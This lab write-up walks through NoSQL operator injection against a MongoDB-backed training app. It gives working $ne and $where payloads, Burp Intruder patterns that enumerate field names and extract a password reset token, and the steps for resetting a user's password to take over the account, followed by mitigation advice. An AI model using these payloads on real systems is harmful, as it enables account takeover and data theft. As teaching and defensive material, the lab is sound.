# Lab 04 – Exploiting NoSQL Operator Injection to Extract Unknown Fields

## Lab Overview

**Objective**

Exploit NoSQL operator injection to identify an unknown password reset field, extract its value, reset Carlos's password, and log in as Carlos.

---

# Vulnerability

The application accepts MongoDB operators and evaluates JavaScript expressions supplied through the `$where` operator.

This allows attackers to enumerate field names and extract sensitive values.

---

# Reconnaissance

1. Attempt to log in as:

```text
carlos
```

using an invalid password.

The application responds:

```text
Invalid username or password
```

---

2. Intercept the login request.

3. Send it to **Burp Repeater**.

---

# Exploitation

### Step 1 – Confirm Operator Injection

Replace:

```json
"password":"invalid"
```

with:

```json
{"$ne":"invalid"}
```

The response changes to:

```text
Account locked
```

confirming operator injection.

---

### Step 2 – Confirm JavaScript Execution

Add:

```json
"$where":"0"
```

The application returns:

```text
Invalid username or password
```

Replace with:

```json
"$where":"1"
```

The response changes to:

```text
Account locked
```

confirming that the `$where` expression is evaluated.

---

### Step 3 – Enumerate Field Names

Use **Burp Intruder** with:

```text
"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
```

Configure a **Cluster Bomb** attack.

Increase the array index to enumerate additional fields.

One of the discovered fields corresponds to the password reset token.

---

### Step 4 – Identify the Reset Endpoint

Test the discovered field as a parameter for:

```text
GET /forgot-password
```

Submitting the correct field name produces:

```text
Invalid token
```

confirming the parameter.

---

### Step 5 – Extract the Token Value

Use:

```text
"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
```

Enumerate the token character by character using **Burp Intruder**.

Recover the complete password reset token.

---

### Step 6 – Reset Carlos's Password

Submit the recovered token to:

```text
GET /forgot-password
```

Reset Carlos's password.

Log in using the new credentials.

---

# Successful Result

Carlos's password is reset and the account is successfully accessed.

---

# Why It Works

The `$where` operator evaluates injected JavaScript.

Using `Object.keys(this)` allows field enumeration, while boolean responses enable extraction of unknown field values one character at a time.

---

# Impact

Successful exploitation allows attackers to:

- Discover hidden fields.
- Extract password reset tokens.
- Reset user passwords.
- Compromise user accounts.

---

# Mitigation

- Reject unexpected MongoDB operators.
- Prevent JavaScript execution inside queries.
- Validate and sanitize user input.
- Use parameterized queries.

---

# Bug Bounty Methodology

1. Confirm operator injection.
2. Test `$where` execution.
3. Enumerate field names.
4. Identify sensitive fields.
5. Extract field values.
6. Exploit the recovered data.

---

# Key Learnings

- `Object.keys(this)` enables field enumeration.
- `$where` can execute injected JavaScript.
- Boolean responses allow extraction of unknown values without direct disclosure.